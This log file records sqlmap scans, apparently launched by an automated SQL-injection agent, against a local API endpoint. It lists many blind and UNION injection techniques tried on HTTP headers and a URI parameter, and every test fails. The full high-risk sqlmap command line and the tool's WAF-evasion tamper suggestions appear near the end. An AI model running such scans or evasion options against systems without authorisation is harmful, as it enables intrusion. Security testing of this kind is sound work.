2025-09-26 18:51:25,390 - INFO - [18:51:25] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:25,396 - INFO - [18:51:25] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:51:25,407 - INFO - [18:51:25] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:51:25,407 - INFO - [18:51:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:51:25,429 - INFO - [18:51:25] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:51:25,436 - INFO - [18:51:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:25,458 - INFO - [18:51:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:25,479 - INFO - [18:51:25] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:25,491 - INFO - [18:51:25] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:25,495 - INFO - [18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:25,525 - INFO - [18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:25,546 - INFO - [18:51:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:51:25,560 - INFO - [18:51:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:51:25,582 - INFO - [18:51:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:25,607 - INFO - [18:51:25] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:25,624 - INFO - [18:51:25] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:25,647 - INFO - [18:51:25] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:25,668 - INFO - [18:51:25] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:25,687 - INFO - [18:51:25] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:25,708 - INFO - [18:51:25] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:25,724 - INFO - [18:51:25] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:51:25,742 - INFO - [18:51:25] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:25,762 - INFO - [18:51:25] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:51:26,096 - INFO - [18:51:26] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:51:26,352 - INFO - [18:51:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:51:26,373 - INFO - [18:51:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:51:26,638 - INFO - [18:51:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:51:26,873 - INFO - [18:51:26] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:51:27,095 - INFO - [18:51:27] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:51:27,319 - INFO - [18:51:27] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:51:27,537 - INFO - [18:51:27] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:51:27,750 - INFO - [18:51:27] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:51:27,963 - INFO - [18:51:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:51:28,491 - INFO - [18:51:28] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:51:29,101 - INFO - [18:51:29] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:51:29,733 - INFO - [18:51:29] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:51:30,499 - INFO - [18:51:30] [WARNING] parameter 'User-Agent' does not seem to be injectable
2025-09-26 18:51:30,499 - INFO - [18:51:30] [INFO] testing if parameter 'Referer' is dynamic
2025-09-26 18:51:30,499 - INFO - [18:51:30] [WARNING] parameter 'Referer' does not appear to be dynamic
2025-09-26 18:51:30,516 - INFO - [18:51:30] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
2025-09-26 18:51:30,516 - INFO - [18:51:30] [INFO] testing for SQL injection on parameter 'Referer'
2025-09-26 18:51:30,584 - INFO - [18:51:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:51:31,067 - INFO - [18:51:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:51:31,645 - INFO - [18:51:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:51:32,039 - INFO - [18:51:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:51:32,338 - INFO - [18:51:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:51:32,694 - INFO - [18:51:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:51:32,772 - INFO - [18:51:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:51:32,889 - INFO - [18:51:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:51:32,968 - INFO - [18:51:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:51:33,191 - INFO - [18:51:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:51:33,513 - INFO - [18:51:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:51:33,684 - INFO - [18:51:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:51:33,880 - INFO - [18:51:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:51:34,154 - INFO - [18:51:34] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:51:34,503 - INFO - [18:51:34] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:51:34,821 - INFO - [18:51:34] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:51:35,333 - INFO - [18:51:35] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:51:35,694 - INFO - [18:51:35] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:51:36,171 - INFO - [18:51:36] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:51:36,461 - INFO - [18:51:36] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:51:36,947 - INFO - [18:51:36] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:51:37,274 - INFO - [18:51:37] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:51:37,851 - INFO - [18:51:37] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:51:38,155 - INFO - [18:51:38] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:51:38,691 - INFO - [18:51:38] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:51:39,032 - INFO - [18:51:39] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:51:39,570 - INFO - [18:51:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:39,577 - INFO - [18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:51:39,592 - INFO - [18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:51:39,600 - INFO - [18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:51:39,608 - INFO - [18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:51:39,623 - INFO - [18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:51:39,628 - INFO - [18:51:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:51:39,638 - INFO - [18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:51:39,646 - INFO - [18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:39,655 - INFO - [18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:51:39,674 - INFO - [18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:51:39,683 - INFO - [18:51:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:51:39,693 - INFO - [18:51:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:39,707 - INFO - [18:51:39] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:51:39,711 - INFO - [18:51:39] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:39,723 - INFO - [18:51:39] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:51:39,746 - INFO - [18:51:39] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:39,756 - INFO - [18:51:39] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:51:39,773 - INFO - [18:51:39] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:39,784 - INFO - [18:51:39] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:51:39,800 - INFO - [18:51:39] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:51:39,817 - INFO - [18:51:39] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:51:39,828 - INFO - [18:51:39] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:51:39,842 - INFO - [18:51:39] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:39,866 - INFO - [18:51:39] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:39,891 - INFO - [18:51:39] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:39,895 - INFO - [18:51:39] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:39,899 - INFO - [18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:39,922 - INFO - [18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:39,954 - INFO - [18:51:39] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:51:39,971 - INFO - [18:51:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:51:39,992 - INFO - [18:51:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:40,014 - INFO - [18:51:40] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:40,035 - INFO - [18:51:40] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:40,059 - INFO - [18:51:40] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:40,081 - INFO - [18:51:40] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:40,103 - INFO - [18:51:40] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:40,122 - INFO - [18:51:40] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:40,140 - INFO - [18:51:40] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:51:40,166 - INFO - [18:51:40] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:40,184 - INFO - [18:51:40] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:51:40,483 - INFO - [18:51:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:51:40,724 - INFO - [18:51:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:51:40,740 - INFO - [18:51:40] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:51:40,977 - INFO - [18:51:40] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:51:41,208 - INFO - [18:51:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:51:41,449 - INFO - [18:51:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:51:41,683 - INFO - [18:51:41] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:51:41,898 - INFO - [18:51:41] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:51:42,152 - INFO - [18:51:42] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:51:42,422 - INFO - [18:51:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:51:43,058 - INFO - [18:51:43] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:51:43,642 - INFO - [18:51:43] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:51:44,301 - INFO - [18:51:44] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:51:44,931 - INFO - [18:51:44] [WARNING] parameter 'Referer' does not seem to be injectable
2025-09-26 18:51:44,931 - INFO - [18:51:44] [INFO] testing if parameter 'Host' is dynamic
2025-09-26 18:51:44,940 - INFO - [18:51:44] [WARNING] parameter 'Host' does not appear to be dynamic
2025-09-26 18:51:44,948 - INFO - [18:51:44] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
2025-09-26 18:51:44,957 - INFO - [18:51:44] [INFO] testing for SQL injection on parameter 'Host'
2025-09-26 18:51:45,004 - INFO - [18:51:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:51:45,441 - INFO - [18:51:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:51:46,124 - INFO - [18:51:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 18:51:46,555 - INFO - [18:51:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:51:46,894 - INFO - [18:51:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 18:51:47,266 - INFO - [18:51:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:51:47,344 - INFO - [18:51:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 18:51:47,486 - INFO - [18:51:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 18:51:47,551 - INFO - [18:51:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:51:47,734 - INFO - [18:51:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 18:51:48,026 - INFO - [18:51:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 18:51:48,202 - INFO - [18:51:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:51:48,404 - INFO - [18:51:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 18:51:48,705 - INFO - [18:51:48] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 18:51:49,067 - INFO - [18:51:49] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:51:49,404 - INFO - [18:51:49] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 18:51:49,970 - INFO - [18:51:49] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:51:50,291 - INFO - [18:51:50] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:51:50,875 - INFO - [18:51:50] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:51:51,328 - INFO - [18:51:51] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:51:52,029 - INFO - [18:51:52] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:51:52,435 - INFO - [18:51:52] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:51:53,029 - INFO - [18:51:53] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:51:53,396 - INFO - [18:51:53] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:51:54,015 - INFO - [18:51:54] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:51:54,334 - INFO - [18:51:54] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:51:54,864 - INFO - [18:51:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:54,876 - INFO - [18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:51:54,894 - INFO - [18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:51:54,899 - INFO - [18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:51:54,907 - INFO - [18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:51:54,919 - INFO - [18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:51:54,932 - INFO - [18:51:54] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:51:54,943 - INFO - [18:51:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:51:54,953 - INFO - [18:51:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:54,963 - INFO - [18:51:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:51:54,976 - INFO - [18:51:54] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:51:55,000 - INFO - [18:51:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:51:55,000 - INFO - [18:51:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:55,021 - INFO - [18:51:55] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:51:55,021 - INFO - [18:51:55] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:55,034 - INFO - [18:51:55] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:51:55,045 - INFO - [18:51:55] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:55,058 - INFO - [18:51:55] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:51:55,069 - INFO - [18:51:55] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:51:55,082 - INFO - [18:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:51:55,092 - INFO - [18:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:51:55,092 - INFO - [18:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:51:55,108 - INFO - [18:51:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:51:55,120 - INFO - [18:51:55] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:55,136 - INFO - [18:51:55] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:55,159 - INFO - [18:51:55] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:55,159 - INFO - [18:51:55] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:55,159 - INFO - [18:51:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:55,178 - INFO - [18:51:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:55,205 - INFO - [18:51:55] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:51:55,217 - INFO - [18:51:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:51:55,237 - INFO - [18:51:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:55,258 - INFO - [18:51:55] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:55,277 - INFO - [18:51:55] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:55,306 - INFO - [18:51:55] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:55,328 - INFO - [18:51:55] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:55,348 - INFO - [18:51:55] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:51:55,362 - INFO - [18:51:55] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:51:55,383 - INFO - [18:51:55] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:51:55,400 - INFO - [18:51:55] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:51:55,422 - INFO - [18:51:55] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:51:55,700 - INFO - [18:51:55] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:51:55,992 - INFO - [18:51:55] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:51:55,999 - INFO - [18:51:55] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:51:56,292 - INFO - [18:51:56] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:51:56,506 - INFO - [18:51:56] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:51:56,711 - INFO - [18:51:56] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:51:56,950 - INFO - [18:51:56] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:51:57,171 - INFO - [18:51:57] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:51:57,399 - INFO - [18:51:57] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:51:57,632 - INFO - [18:51:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:51:58,335 - INFO - [18:51:58] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:51:58,917 - INFO - [18:51:58] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:51:59,489 - INFO - [18:51:59] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:52:00,117 - INFO - [18:52:00] [WARNING] parameter 'Host' does not seem to be injectable
2025-09-26 18:52:00,117 - INFO - [18:52:00] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:52:00,117 - INFO - [18:52:00] [WARNING] HTTP error codes detected during run:
2025-09-26 18:52:00,117 - INFO - 404 (Not Found) - 2314 times
2025-09-26 18:52:00,117 - INFO - 
2025-09-26 18:52:00,117 - INFO - [*] ending @ 18:52:00 /2025-09-26/
2025-09-26 18:52:00,117 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/api/user/1 --output-dir 'attack-logs-dynamic\Get_User_by_ID__API__sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9.4#dev}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:50:52 /2025-09-26/

[18:50:53] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID__API__sqlmap' as the output directory
[18:50:54] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:50:54] [INFO] testing connection to the target URL
[18:50:54] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:50:54] [INFO] testing if the target URL content is stable
[18:50:54] [INFO] target URL content is stable
[18:50:54] [INFO] testing if URI parameter '#1*' is dynamic
[18:50:55] [WARNING] URI parameter '#1*' does not appear to be dynamic
[18:50:55] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:50:55] [INFO] testing for SQL injection on URI parameter '#1*'
[18:50:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:50:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:50:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
